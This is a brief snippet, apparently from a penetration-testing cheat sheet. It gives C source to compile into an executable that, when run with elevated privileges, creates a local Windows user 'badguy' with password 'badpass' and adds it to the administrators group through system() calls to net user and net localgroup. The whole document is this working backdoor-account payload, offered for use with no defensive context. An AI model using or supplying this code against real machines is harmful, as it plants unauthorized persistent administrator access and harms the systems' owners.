Requires escalated privileges, must be compiled to exe.

Adds a user to the local machine and adds that user to the admin group.  

```c
#include <stdlib.h>

int main ()
{
        int i;

        i = system ("net user badguy badpass /add");
        i = system ("net localgroup administrators badguy /add");

                return 0;
}
```

